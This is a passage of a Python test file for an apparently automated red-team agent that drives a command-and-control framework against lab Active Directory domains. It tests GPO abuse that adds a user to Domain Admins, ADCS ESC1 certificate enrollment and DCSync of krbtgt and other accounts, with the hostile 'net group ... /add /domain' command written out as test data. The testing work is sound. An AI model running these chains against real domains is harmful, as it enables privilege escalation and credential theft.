    asyncio.run(mt._ensure_capability_executor_proof_target(action, inputs))

    assert inputs["current_host"] == "WS01"
    assert inputs["proof_path"] == r"C:\SageProof\sage_gpo_srv02_policy_whoami.txt"
    assert inputs["proof_unc"] == r"\\srv02.range.local\SageProof\sage_gpo_srv02_policy_whoami.txt"


def test_adcs_esc_enroll_runtime_inputs_use_scoped_eval_hint(monkeypatch):
    monkeypatch.setenv(
        "SAGE_EVAL_ADCS_ESC_ENROLLMENT_HINTS_JSON",
        json.dumps([{
            "domain": "lab.local",
            "ca_host": "ca01",
            "ca_name": r"ca01.lab.local\LAB-CA",
            "template": "VulnerableUser",
            "esc_type": "esc1",
        }]),
    )
    mt = _make_tools()
    action = capabilities.CapabilityAction(
        name="adcs-esc-certificate-enroll",
        target="domain=lab.local;account=administrator;ca_host=ca01;callback=13",
        preconditions=["adcs-ca-key-export-blocked:ca01@lab.local", "live-callback:13"],
        effects=["adcs-enrolled-certificate:administrator@lab.local"],
        intent={
            "capability": "adcs-esc-certificate-enroll",
            "domain": "lab.local",
            "account": "administrator",
            "ca_host": "ca01",
            "callback_id": "13",
        },
    )
    inputs = {"callback_id": "13"}

    asyncio.run(mt._augment_capability_runtime_inputs(action, inputs))

    assert inputs["ca_name"] == r"ca01.lab.local\LAB-CA"
    assert inputs["template"] == "VulnerableUser"
    assert inputs["esc_type"] == "esc1"
    assert inputs["adcs_esc_enrollment_hint_source"] == "SAGE_EVAL_ADCS_ESC_ENROLLMENT_HINTS_JSON"


def test_adcs_esc_enroll_runtime_inputs_do_not_override_explicit_or_mismatched_hint(monkeypatch):
    monkeypatch.setenv(
        "SAGE_EVAL_ADCS_ESC_ENROLLMENT_HINTS_JSON",
        json.dumps([{
            "domain": "other.local",
            "ca_host": "ca99",
            "ca_name": r"ca99.other.local\OTHER-CA",
            "template": "OtherTemplate",
        }]),
    )
    mt = _make_tools()
    action = capabilities.CapabilityAction(
        name="adcs-esc-certificate-enroll",
        target="domain=lab.local;account=administrator;ca_host=ca01;callback=13",
        preconditions=["adcs-ca-key-export-blocked:ca01@lab.local", "live-callback:13"],
        effects=["adcs-enrolled-certificate:administrator@lab.local"],
        intent={
            "capability": "adcs-esc-certificate-enroll",
            "domain": "lab.local",
            "account": "administrator",
            "ca_host": "ca01",
            "callback_id": "13",
        },
    )
    inputs = {
        "callback_id": "13",
        "ca_name": r"ca01.lab.local\EXPLICIT-CA",
        "template": "ExplicitTemplate",
    }

    asyncio.run(mt._augment_capability_runtime_inputs(action, inputs))

    assert inputs["ca_name"] == r"ca01.lab.local\EXPLICIT-CA"
    assert inputs["template"] == "ExplicitTemplate"
    assert "adcs_esc_enrollment_hint_source" not in inputs


def test_gpo_proof_target_preserves_explicit_action_proof_path():
    mt = _make_tools()
    action = capabilities.CapabilityAction(
        name="gpo-controlled-system-exec",
        target="gpo=starkwallpaper;domain=north.sevenkingdoms.local",
        preconditions=[],
        effects=["system-exec:gpo:starkwallpaper@north.sevenkingdoms.local"],
        intent={
            "capability": "gpo-controlled-system-exec",
            "domain": "north.sevenkingdoms.local",
            "gpo": "starkwallpaper",
            "gpo_guid": "0a93e998-2599-4da8-9717-6744993ded3a",
            "affected_dc_hosts": ["winterfell"],
            "proof_path": (
                r"\\north.sevenkingdoms.local\SYSVOL\north.sevenkingdoms.local\Policies"
                r"\{0A93E998-2599-4DA8-9717-6744993DED3A}"
                r"\Machine\Preferences\ScheduledTasks\sage_gpo_winterfell_whoami.txt"
            ),
        },
    )
    inputs = {"callback_id": 3, "current_host": "CASTELBLACK"}

    asyncio.run(mt._ensure_capability_executor_proof_target(action, inputs))

    assert inputs["proof_path"].endswith(r"\sage_gpo_winterfell_whoami.txt")
    assert inputs["proof_unc"] == inputs["proof_path"]


def test_gpo_action_dict_preserves_affected_hosts_to_skip_wrong_local_gpupdate():
    mt = _make_tools()
    mt._engagement_footholds = [
        engagement_state.Foothold(
            callback_id="3",
            agent="apollo",
            host="CASTELBLACK",
            forest="north.sevenkingdoms.local",
            identity="NORTH\\samwell.tarly",
            integrity="medium",
            alive=True,
            source="test",
            timestamp="2026-06-15T20:00:00Z",
        )
    ]

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "gpo-controlled-system-exec",
            "callback_id": "3",
            "gpo": "starkwallpaper",
            "domain": "north.sevenkingdoms.local",
            "gpo_guid": "0a93e998-2599-4da8-9717-6744993ded3a",
            "affected_dc_hosts": ["winterfell"],
            "method": "gpp-immediate-task-fallback",
            "allow_proof_only": True,
            "wait_seconds": 300,
        },
        {"callback_id": "3"},
    )))

    assert plan["ok"] is True
    assert [command["command"] for command in plan["commands"]][:2] == ["powerpick", "wait_for_seconds"]
    assert "gpupdate /force" not in json.dumps(plan["commands"])


def test_build_capability_commands_gpo_fallback_augments_gpo_from_guid_graph_fact():
    mt = _make_tools()
    mt._engagement_graph_facts = [
        engagement_state.GraphFact(
            "gpo-guid:starkwallpaper:0a93e998-2599-4da8-9717-6744993ded3a",
            "bloodhound:cypher",
            "2026-06-15T20:00:00Z",
            600,
        ),
        engagement_state.GraphFact(
            "gpo-affects-dc:starkwallpaper:winterfell:north.sevenkingdoms.local",
            "bloodhound:cypher",
            "2026-06-15T20:00:00Z",
            600,
        ),
    ]

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "gpo-controlled-system-exec",
            "domain": "north.sevenkingdoms.local",
            "gpo_guid": "{0A93E998-2599-4DA8-9717-6744993DED3A}",
            "method": "gpp-immediate-task-fallback",
            "allow_proof_only": True,
            "callback_id": 3,
        },
        {"callback_id": 3, "gp_refresh_wait_seconds": 13},
    )))

    assert plan["ok"] is True
    writer_script = plan["commands"][0]["parameters"]
    assert "$gpoName = 'starkwallpaper'" in writer_script
    assert "$ldapServer = 'winterfell.north.sevenkingdoms.local'" in writer_script
    assert [command["command"] for command in plan["commands"]][:2] == ["powerpick", "wait_for_seconds"]
    assert plan["commands"][1]["parameters"]["seconds"] == 13


def test_build_capability_commands_gpo_fallback_accepts_guid_without_graph_facts():
    mt = _make_tools()

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "gpo-controlled-system-exec",
            "domain": "north.sevenkingdoms.local",
            "gpo_guid": "{0A93E998-2599-4DA8-9717-6744993DED3A}",
            "method": "gpp-immediate-task-fallback",
            "allow_proof_only": True,
            "callback_id": 3,
        },
        {"callback_id": 3},
    )))

    assert plan["ok"] is True
    writer_script = plan["commands"][0]["parameters"]
    assert "$gpoName = '0a93e998-2599-4da8-9717-6744993ded3a'" in writer_script
    assert "$gpoGuidInput = '{0A93E998-2599-4DA8-9717-6744993DED3A}'" in writer_script


def test_execute_capability_gpo_fallback_waits_and_records_membership_proof(monkeypatch):
    mt = _make_tools()
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
    mt._engagement_footholds = [
        engagement_state.Foothold(
            callback_id="3",
            agent="apollo",
            host="CASTELBLACK",
            forest="north.sevenkingdoms.local",
            identity="NORTH\\samwell.tarly",
            integrity="medium",
            alive=True,
            source="test",
            timestamp="2026-06-15T20:00:00Z",
        )
    ]
    waits = []

    async def fake_sleep(seconds, result=None):
        if seconds:
            waits.append(seconds)
        return result

    monkeypatch.setattr(mythic_tools.asyncio, "sleep", fake_sleep)
    outputs = iter([
        (
            "scheduled task xml valid: \\\\north\\SYSVOL\\Policies\\{guid}\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml\n"
            "cse extension registered: scheduled tasks extension\n"
            "ldap version bumped: 1 -> 2\n"
            "gpt.ini version bumped: 2\n"
            "command path present: cmd.exe\n"
        ),
        (
            "Group name     Domain Admins\n"
            "Members\n"
            "-------------------------------------------------------------------------------\n"
            "Administrator            samwell.tarly\n"
            "The command completed successfully.\n"
        ),
    ])
    calls = {}

    with patch.object(access_reconciler, "reconcile_access", _seeded_reconcile(mt)), \
        _split_issue(lambda: next(outputs), calls, display_id=3135):
        raw = asyncio.run(mt.execute_capability(
            {
                "capability": "gpo-controlled-system-exec",
                "domain": "north.sevenkingdoms.local",
                "gpo": "starkwallpaper",
                "callback_id": 3,
            },
            {
                "callback_id": 3,
                "method": "gpp-immediate-task-fallback",
                "primary_failure_observed": True,
                "command": "cmd.exe",
                "arguments": r'/c net group "Domain Admins" samwell.tarly /add /domain',
                "wait_seconds": 1,
            },
        ))

    result = json.loads(raw)
    assert result["ok"] is True
    assert result["verdict"] == "achieved"
    assert waits == [1]
    assert [call["command_name"] for call in calls["issued"]] == ["powerpick", "shell"]
    assert "system-exec:gpo:starkwallpaper@north.sevenkingdoms.local" in result["achieved_effects"]
    assert result["issued"][2]["expected_probe"] == "extract_gpo_domain_admin_membership_probe"
    assert result["issued"][2]["verify_verdict"] == "achieved"


def test_execute_capability_gpo_fallback_retries_delayed_membership_proof(monkeypatch):
    mt = _make_tools()
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
    mt._engagement_footholds = [
        engagement_state.Foothold(
            callback_id="3",
            agent="apollo",
            host="CASTELBLACK",
            forest="north.sevenkingdoms.local",
            identity="NORTH\\samwell.tarly",
            integrity="medium",
            alive=True,
            source="test",
            timestamp="2026-06-15T20:00:00Z",
        )
    ]
    waits = []

    async def fake_sleep(seconds, result=None):
        if seconds:
            waits.append(seconds)
        return result

    monkeypatch.setattr(mythic_tools.asyncio, "sleep", fake_sleep)
    outputs = iter([
        (
            "scheduled task xml valid: \\\\north\\SYSVOL\\Policies\\{guid}\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml\n"
            "cse extension registered: scheduled tasks extension\n"
            "ldap version bumped: 1 -> 2\n"
            "gpt.ini version bumped: 2\n"
            "command path present: cmd.exe\n"
        ),
        (
            "Group name     Domain Admins\n"
            "Members\n"
            "-------------------------------------------------------------------------------\n"
            "Administrator            eddard.stark\n"
            "The command completed successfully.\n"
        ),
        (
            "Group name     Domain Admins\n"
            "Members\n"
            "-------------------------------------------------------------------------------\n"
            "Administrator            eddard.stark             samwell.tarly\n"
            "The command completed successfully.\n"
        ),
    ])
    calls = {}

    with patch.object(access_reconciler, "reconcile_access", _seeded_reconcile(mt)), \
        _split_issue(lambda: next(outputs), calls, display_id=3138):
        raw = asyncio.run(mt.execute_capability(
            {
                "capability": "gpo-controlled-system-exec",
                "domain": "north.sevenkingdoms.local",
                "gpo": "starkwallpaper",
                "callback_id": 3,
            },
            {
                "callback_id": 3,
                "method": "gpp-immediate-task-fallback",
                "primary_failure_observed": True,
                "command": "cmd.exe",
                "arguments": r'/c net group "Domain Admins" samwell.tarly /add /domain',
                "wait_seconds": 1,
                "proof_retries": 1,
                "proof_retry_delay_seconds": 0,
            },
        ))

    result = json.loads(raw)
    assert result["ok"] is True
    assert result["verdict"] == "achieved"
    assert waits == [1]
    assert [call["command_name"] for call in calls["issued"]] == ["powerpick", "shell", "shell"]
    assert result["issued"][2]["verify_verdict"] == "partial"
    assert result["issued"][3]["retry_attempt"] == 1
    assert result["issued"][3]["retry_reason"] == "final proof was not available yet"
    assert result["issued"][3]["verify_verdict"] == "achieved"
    assert "system-exec:gpo:starkwallpaper@north.sevenkingdoms.local" in result["achieved_effects"]


def test_execute_capability_gpo_rewrites_live_fallback_proof_marker_to_primary_group_add(monkeypatch):
    monkeypatch.setenv("SAGE_TRAJECTORY_DISABLE", "1")
    mt = _make_tools()
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
    mt._engagement_footholds = [
        engagement_state.Foothold(
            callback_id="3",
            agent="apollo",
            host="CASTELBLACK",
            forest="north.sevenkingdoms.local",
            identity="NORTH\\samwell.tarly",
            integrity="medium",
            alive=True,
            source="test",
            timestamp="2026-06-15T20:00:00Z",
        )
    ]
    waits = []

    async def fake_sleep(seconds, result=None):
        if seconds:
            waits.append(seconds)
        return result

    monkeypatch.setattr(mythic_tools.asyncio, "sleep", fake_sleep)
    outputs = iter([
        "GPO was modified successfully",
        (
            "Group name     Domain Admins\n"
            "Members\n"
            "-------------------------------------------------------------------------------\n"
            "Administrator            samwell.tarly\n"
            "The command completed successfully.\n"
        ),
    ])
    calls = {}

    with patch.object(access_reconciler, "reconcile_access", _seeded_reconcile(mt)), \
        _split_issue(lambda: next(outputs), calls, display_id=3137):
        raw = asyncio.run(mt.execute_capability(
            {
                "capability": "gpo-controlled-system-exec",
                "gpo": "starkwallpaper",
                "domain": "north.sevenkingdoms.local",
                "callback_id": "3",
                "method": "gpp-immediate-task-fallback",
                "intent": "controlled GPO can deliver a computer-side SYSTEM action; prove execution before chaining",
                "verify": "system_command_succeeded",
            },
            {
                "callback_id": 3,
                "domain": "north.sevenkingdoms.local",
                "gpo": "starkwallpaper",
                "method": "gpp-immediate-task-fallback",
                "command": "cmd.exe",
                "arguments": r"/c whoami > C:\Users\Public\starkwallpaper_system_proof.txt",
                "proof_path": r"C:\Users\Public\starkwallpaper_system_proof.txt",
                "wait_seconds": 1,
                "proof_retries": 0,
            },
        ))

    result = json.loads(raw)
    assert result["ok"] is True
    assert result["verdict"] == "achieved"
    assert waits == [1]
    assert [call["command_name"] for call in calls["issued"]] == ["execute_assembly", "shell"]
    first = calls["issued"][0]
    assert first["parameters"]["assembly_name"] == "SharpGPOAbuse.exe"
    assert r'net group \"Domain Admins\" samwell.tarly /add /domain' in first["parameters"]["assembly_arguments"]
    assert ">" not in first["parameters"]["assembly_arguments"]
    assert result["issued"][-1]["expected_probe"] == "extract_gpo_domain_admin_membership_probe"
    assert result["issued"][-1]["verify_verdict"] == "achieved"


def test_execute_capability_gpo_direct_invalid_xml_waits_for_membership_before_repair(monkeypatch):
    monkeypatch.setenv("SAGE_TRAJECTORY_DISABLE", "1")
    mt = _make_tools()
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
    mt._engagement_footholds = [
        engagement_state.Foothold(
            callback_id="3",
            agent="apollo",
            host="CASTELBLACK",
            forest="north.sevenkingdoms.local",
            identity="NORTH\\samwell.tarly",
            integrity="medium",
            alive=True,
            source="test",
            timestamp="2026-06-15T20:00:00Z",
        )
    ]
    mt._engagement_graph_facts = [
        engagement_state.GraphFact(
            "gpo-affects-dc:starkwallpaper:winterfell:north.sevenkingdoms.local",
            "bloodhound:cypher",
            "2026-06-15T20:00:00Z",
            600,
        ),
    ]
    waits = []

    async def fake_sleep(seconds, result=None):
        if seconds:
            waits.append(seconds)
        return result

    monkeypatch.setattr(mythic_tools.asyncio, "sleep", fake_sleep)
    outputs = iter([
        "GPO was modified successfully",
        (
            "<ScheduledTasks><Task><Arguments>"
            "cmd.exe /c net group \"Domain Admins\" samwell.tarly /add /domain && whoami"
            "</Arguments></Task></ScheduledTasks>"
        ),
        (
            "Group name     Domain Admins\n"
            "Members\n"
            "-------------------------------------------------------------------------------\n"
            "Administrator            samwell.tarly\n"
            "The command completed successfully.\n"
        ),
    ])
    calls = {}

    with patch.object(access_reconciler, "reconcile_access", _seeded_reconcile(mt)), \
        _split_issue(lambda: next(outputs), calls, display_id=3136):
        raw = asyncio.run(mt.execute_capability(
            {
                "capability": "gpo-controlled-system-exec",
                "domain": "north.sevenkingdoms.local",
                "gpo": "starkwallpaper",
                "gpo_guid": "{0A93E998-2599-4DA8-9717-6744993DED3A}",
                "callback_id": 3,
            },
            {
                "callback_id": 3,
                "command": "cmd.exe",
                "arguments": r'/c net group "Domain Admins" samwell.tarly /add /domain',
                "wait_seconds": 1,
                "proof_retries": 0,
            },
        ))

    result = json.loads(raw)
    assert result["ok"] is True
    assert result["verdict"] == "achieved"
    assert waits == [1]
    assert [call["command_name"] for call in calls["issued"]] == ["execute_assembly", "shell", "shell"]
    assert result["issued"][-1]["expected_probe"] == "extract_gpo_domain_admin_membership_probe"
    assert result["issued"][-1]["verify_verdict"] == "achieved"
    assert "gpo_artifact_repair" not in result
    assert result["transaction"]["status"] == "effect_achieved"
    assert result["transaction"]["artifact_warnings"][0]["nonblocking"] is True
    assert "system-exec:gpo:starkwallpaper@north.sevenkingdoms.local" in result["achieved_effects"]


def test_execute_capability_gpo_direct_valid_xml_system_author_does_not_close_effect_transaction(monkeypatch):
    monkeypatch.setenv("SAGE_TRAJECTORY_DISABLE", "1")
    mt = _make_tools()
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
    mt._engagement_footholds = [
        engagement_state.Foothold(
            callback_id="3",
            agent="apollo",
            host="CASTELBLACK",
            forest="north.sevenkingdoms.local",
            identity="NORTH\\samwell.tarly",
            integrity="medium",
            alive=True,
            source="test",
            timestamp="2026-06-15T20:00:00Z",
        )
    ]
    waits = []

    async def fake_sleep(seconds, result=None):
        if seconds:
            waits.append(seconds)
        return result

    monkeypatch.setattr(mythic_tools.asyncio, "sleep", fake_sleep)
    valid_xml = (
        "<ScheduledTasks><Task><Properties><Author>NT AUTHORITY\\SYSTEM</Author>"
        "<Arguments>/c net group &quot;Domain Admins&quot; samwell.tarly /add /domain</Arguments>"
        "</Properties></Task></ScheduledTasks>"
    )
    outputs = iter([
        "GPO was modified successfully",
        valid_xml,
        (
            "Group name     Domain Admins\n"
            "Members\n"
            "-------------------------------------------------------------------------------\n"
            "Administrator            samwell.tarly\n"
            "The command completed successfully.\n"
        ),
    ])
    calls = {}

    with patch.object(access_reconciler, "reconcile_access", _seeded_reconcile(mt)), \
        _split_issue(lambda: next(outputs), calls, display_id=3140):
        raw = asyncio.run(mt.execute_capability(
            {
                "capability": "gpo-controlled-system-exec",
                "domain": "north.sevenkingdoms.local",
                "gpo": "starkwallpaper",
                "gpo_guid": "{0A93E998-2599-4DA8-9717-6744993DED3A}",
                "callback_id": 3,
            },
            {
                "callback_id": 3,
                "command": "cmd.exe",
                "arguments": r'/c net group "Domain Admins" samwell.tarly /add /domain',
                "wait_seconds": 1,
                "proof_retries": 0,
            },
        ))

    result = json.loads(raw)
    assert result["ok"] is True
    assert result["verdict"] == "achieved"
    assert waits == [1]
    assert [call["command_name"] for call in calls["issued"]] == ["execute_assembly", "shell", "shell"]
    assert result["issued"][1]["expected_probe"] == "extract_gpo_system_exec_probe"
    assert result["issued"][1]["verify_verdict"] == "partial"
    assert result["issued"][-1]["expected_probe"] == "extract_gpo_domain_admin_membership_probe"
    assert result["issued"][-1]["verify_verdict"] == "achieved"
    assert [call["command_name"] for call in calls["issued"]].count("execute_assembly") == 1
    verification_events = [
        event for event in result["transaction"]["events"]
        if event["stage"] == "effect_verification"
    ]
    assert any(
        event["final_probe"] is False and event["verdict"] == "partial"
        for event in verification_events
    )
    assert verification_events[-1]["final_probe"] is True
    assert result["transaction"]["status"] == "effect_achieved"
    hop = next(
        hop for hop in mt._engagement_hops
        if "system-exec:gpo:starkwallpaper@north.sevenkingdoms.local" in hop.satisfied_effects
    )
    assert hop.evidence["source"] == "execute_capability"


def test_execute_capability_gpo_proof_only_does_not_inherit_system_author_from_xml(monkeypatch):
    monkeypatch.setenv("SAGE_TRAJECTORY_DISABLE", "1")
    mt = _make_tools()
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
    mt._engagement_footholds = [
        engagement_state.Foothold(
            callback_id="3",
            agent="apollo",
            host="CASTELBLACK",
            forest="north.sevenkingdoms.local",
            identity="NORTH\\samwell.tarly",
            integrity="medium",
            alive=True,
            source="test",
            timestamp="2026-06-15T20:00:00Z",
        )
    ]

    async def fake_sleep(seconds, result=None):
        return result

    monkeypatch.setattr(mythic_tools.asyncio, "sleep", fake_sleep)
    valid_xml = (
        "<ScheduledTasks><Task><Properties><Author>NT AUTHORITY\\SYSTEM</Author>"
        "<Arguments>/c whoami &gt; C:\\Users\\Public\\sage_gpo_starkwallpaper_whoami.txt</Arguments>"
        "</Properties></Task></ScheduledTasks>"
    )
    outputs = iter([
        "GPO was modified successfully",
        valid_xml,
        "The system cannot find the file specified.",
    ])
    calls = {}

    with patch.object(access_reconciler, "reconcile_access", _seeded_reconcile(mt)), \
        _split_issue(lambda: next(outputs), calls, display_id=3141):
        raw = asyncio.run(mt.execute_capability(
            {
                "capability": "gpo-controlled-system-exec",
                "domain": "north.sevenkingdoms.local",
                "gpo": "starkwallpaper",
                "gpo_guid": "{0A93E998-2599-4DA8-9717-6744993DED3A}",
                "callback_id": 3,
            },
            {
                "callback_id": 3,
                "allow_proof_only": True,
                "wait_seconds": 1,
                "proof_retries": 0,
            },
        ))

    result = json.loads(raw)
    assert result["ok"] is False
    assert result["stopped_after"] == "unresolved_effect_transaction"
    assert result["issued"][1]["verify_verdict"] == "partial"
    assert result["issued"][-1]["verify_verdict"] == "partial"
    assert "system-exec:gpo:starkwallpaper@north.sevenkingdoms.local" not in mt._capability_achieved_effects()


def test_execute_capability_gpo_direct_missing_membership_pins_transaction(monkeypatch):
    monkeypatch.setenv("SAGE_TRAJECTORY_DISABLE", "1")
    mt = _make_tools()
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
    mt._engagement_footholds = [
        engagement_state.Foothold(
            callback_id="3",
            agent="apollo",
            host="CASTELBLACK",
            forest="north.sevenkingdoms.local",
            identity="NORTH\\samwell.tarly",
            integrity="medium",
            alive=True,
            source="test",
            timestamp="2026-06-15T20:00:00Z",
        )
    ]
    waits = []

    async def fake_sleep(seconds, result=None):
        if seconds:
            waits.append(seconds)
        return result

    monkeypatch.setattr(mythic_tools.asyncio, "sleep", fake_sleep)
    valid_xml = (
        "<ScheduledTasks><Task><Arguments>"
        "/c net group &quot;Domain Admins&quot; samwell.tarly /add /domain"
        "</Arguments></Task></ScheduledTasks>"
    )
    outputs = iter([
        "GPO was modified successfully",
        valid_xml,
        (
            "Group name     Domain Admins\n"
            "Members\n"
            "-------------------------------------------------------------------------------\n"
            "Administrator\n"
            "The command completed successfully.\n"
        ),
    ])
    calls = {}

    with _split_issue(lambda: next(outputs), calls, display_id=3137):
        raw = asyncio.run(mt.execute_capability(
            {
                "capability": "gpo-controlled-system-exec",
                "domain": "north.sevenkingdoms.local",
                "gpo": "starkwallpaper",
                "gpo_guid": "{0A93E998-2599-4DA8-9717-6744993DED3A}",
                "callback_id": 3,
            },
            {
                "callback_id": 3,
                "command": "cmd.exe",
                "arguments": r'/c net group "Domain Admins" samwell.tarly /add /domain',
                "wait_seconds": 1,
                "proof_retries": 0,
            },
        ))

    result = json.loads(raw)
    assert result["ok"] is False
    assert result["stopped_after"] == "unresolved_effect_transaction"
    assert result["transaction"]["status"] == "effect_unverified"
    assert result["transaction"]["pin_planner"] is True
    assert "extract_gpo_domain_admin_membership_probe" in result["transaction"]["proof_obligations"]
    assert waits == [1]
    assert [call["command_name"] for call in calls["issued"]] == ["execute_assembly", "shell", "shell"]


def test_execute_capability_repairs_gpo_artifact_read_without_replaying_mutation(monkeypatch):
    monkeypatch.setenv("SAGE_TRAJECTORY_DISABLE", "1")
    mt = _make_tools()
    mt._engagement_footholds = [
        engagement_state.Foothold(
            callback_id="3",
            agent="merlin",
            host="CASTELBLACK",
            forest="north.sevenkingdoms.local",
            identity="NORTH\\samwell.tarly",
            integrity="medium",
            alive=True,
            source="test",
            timestamp="2026-06-15T20:00:00Z",
        )
    ]
    waits = []
    shell_schema_calls = {"count": 0}

    async def fake_payload_type(callback_display_id):
        assert callback_display_id == 3
        return "merlin"

    async def fake_schema(command, callback_display_id):
        if command == "shell":
            shell_schema_calls["count"] += 1
            return None if shell_schema_calls["count"] == 1 else _merlin_shell_schema()
        return []

    async def fake_sleep(seconds, result=None):
        if seconds:
            waits.append(seconds)
        return result

    real_build = mt._capability_build_command_payload

    async def malformed_old_merlin_build(action, inputs):
        payload = await real_build(action, inputs)
        artifact_read = payload["commands"][1]
        assert artifact_read["command"] == "run"
        assert artifact_read["parameters"]["executable"] == "more.com"
        artifact_read["command"] = "shell"
        artifact_read["parameters"] = "type " + artifact_read["parameters"]["arguments"]
        return payload

    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
    monkeypatch.setattr(mt, "_fetch_command_schema", fake_schema)
    monkeypatch.setattr(mythic_tools.asyncio, "sleep", fake_sleep)
    monkeypatch.setattr(mt, "_capability_build_command_payload", malformed_old_merlin_build)

    valid_xml = (
        "<ScheduledTasks><Task><Arguments>"
        "/c net group &quot;Domain Admins&quot; samwell.tarly /add /domain"
        "</Arguments></Task></ScheduledTasks>"
    )
    outputs = iter([
        "GPO was modified successfully",
        "Failed to run shell's ParseArgString function: invalid character 'y' in literal true (expecting 'r')",
        valid_xml,
        (
            "Group name     Domain Admins\n"
            "Members\n"
            "-------------------------------------------------------------------------------\n"
            "Administrator            samwell.tarly\n"
            "The command completed successfully.\n"
        ),
    ])
    calls = {}

    with patch.object(access_reconciler, "reconcile_access", _seeded_reconcile(mt)), \
        _split_issue(lambda: next(outputs), calls, display_id=3139):
        raw = asyncio.run(mt.execute_capability(
            {
                "capability": "gpo-controlled-system-exec",
                "domain": "north.sevenkingdoms.local",
                "gpo": "starkwallpaper",
                "gpo_guid": "{0A93E998-2599-4DA8-9717-6744993DED3A}",
                "callback_id": 3,
            },
            {
                "callback_id": 3,
                "command": "cmd.exe",
                "arguments": r'/c net group "Domain Admins" samwell.tarly /add /domain',
                "wait_seconds": 1,
                "proof_retries": 0,
            },
        ))

    result = json.loads(raw)
    assert result["ok"] is True
    assert result["verdict"] == "achieved"
    assert waits == [1]
    assert [call["command_name"] for call in calls["issued"]] == [
        "execute-assembly",
        "shell",
        "shell",
        "run",
    ]
    assert calls["issued"][1]["parameters"].startswith("type ")
    assert calls["issued"][2]["parameters"]["args"].startswith("type ")
    assert calls["issued"][3]["parameters"] == {
        "executable": "net.exe",
        "arguments": "user samwell.tarly /domain",
    }
    assert [call["command_name"] for call in calls["issued"]].count("execute-assembly") == 1
    assert result["issued"][1]["repair_attempt"] == 1
    assert result["issued"][1]["repair_kind"] == "rebuild_with_payload_schema"


def test_build_capability_commands_supports_dcsync_account():
    mt = _make_tools()
    action = capabilities.CapabilityAction(
        name="dcsync-account",
        target="domain=lab.local;account=alice",
        preconditions=["ds-replication-rights:lab.local", "live-foothold:*"],
        effects=["creds:alice@lab.local"],
        intent={"capability": "dcsync-account", "domain": "lab.local", "account": "alice"},
    )

    plan = json.loads(asyncio.run(mt.build_capability_commands(action, {"dc": "dc01.lab.local"})))

    assert plan["ok"] is True
    assert plan["commands"][0]["command"] == "dcsync"
    assert plan["commands"][0]["parameters"] == {
        "domain": "lab.local",
        "user": "alice",
        "dc": "dc01.lab.local",
    }
    assert plan["action"]["effects"] == ["creds:alice@lab.local"]


def test_build_capability_commands_canonicalizes_dcsync_alias_to_krbtgt(monkeypatch):
    mt = _make_tools()
    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(0, result="dc01.lab.local")

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {"capability": "dcsync", "domain": "lab.local", "account": "krbtgt", "callback_id": "13"},
        {},
    )))

    assert plan["ok"] is True
    assert plan["action"]["name"] == "dcsync-krbtgt"
    assert plan["action"]["target"] == "domain=lab.local;account=krbtgt"
    assert plan["action"]["effects"] == ["krbtgt-hash:lab.local"]
    assert plan["commands"][0]["command"] == "dcsync"
    assert plan["commands"][0]["parameters"] == {
        "domain": "lab.local",
        "user": "krbtgt",
        "dc": "dc01.lab.local",
    }


def test_build_capability_commands_canonicalizes_netbios_qualified_krbtgt(monkeypatch):
    mt = _make_tools()
    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(0, result="dc01.sevenkingdoms.local")

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "dcsync-krbtgt",
            "domain": "sevenkingdoms.local",
            "account": r"SEVENKINGDOMS\krbtgt",
            "callback_id": "13",
        },
        {},
    )))

    assert plan["ok"] is True
    assert plan["action"]["name"] == "dcsync-krbtgt"
    assert plan["action"]["target"] == "domain=sevenkingdoms.local;account=krbtgt"
    assert plan["action"]["effects"] == ["krbtgt-hash:sevenkingdoms.local"]
    assert plan["commands"][0]["parameters"] == {
        "domain": "sevenkingdoms.local",
        "user": "krbtgt",
        "dc": "dc01.sevenkingdoms.local",
    }


def test_build_capability_commands_canonicalizes_dcsync_alias_to_account():
    mt = _make_tools()

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {"capability": "dcsync", "domain": "lab.local", "account": "alice", "callback_id": "13"},
        {"dc": "dc01.lab.local"},
    )))

    assert plan["ok"] is True
    assert plan["action"]["name"] == "dcsync-account"
    assert plan["action"]["target"] == "domain=lab.local;account=alice"
    assert plan["action"]["effects"] == ["creds:alice@lab.local"]
    assert plan["commands"][0]["command"] == "dcsync"
    assert plan["commands"][0]["parameters"] == {
        "domain": "lab.local",
        "user": "alice",
        "dc": "dc01.lab.local",
    }


def test_build_capability_commands_selects_account_key_for_account_context():
    mt = _make_tools()

    async def fake_fetch_credentials(now):
        return [
            {
                "id": 31,
                "account": "alice",
                "realm": "lab.local",
                "type": "hash",
                "credential_text": "b" * 32,
                "comment": "ntlm",
            },
            {
                "id": 32,
                "account": "LAB\\alice",
                "realm": "lab.local",
                "type": "key",
                "credential_text": "a" * 64,
                "comment": "aes256",
            },
        ]

    mt._fetch_credentials_cached = fake_fetch_credentials
